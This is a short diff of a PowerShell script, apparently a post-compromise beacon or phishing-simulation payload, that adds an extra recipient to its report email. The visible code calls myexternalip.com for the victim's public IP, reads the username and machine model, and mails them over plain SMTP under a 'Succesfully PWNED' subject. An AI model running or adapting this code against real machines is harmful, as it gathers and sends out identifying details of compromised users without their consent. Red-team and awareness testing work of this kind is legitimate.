@@ -23,6 +23,7 @@ $smtp = new-object Net.Mail.SmtpClient("10.10.0.3","25")
 $smtp.EnableSsl = $false
 $Message.From = "georges.lariviere@setln.fr"
 $Message.To.Add("benjamin.lemangnen@setin.fr")
+$Message.To.Add("leo.mendes@setin.fr")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
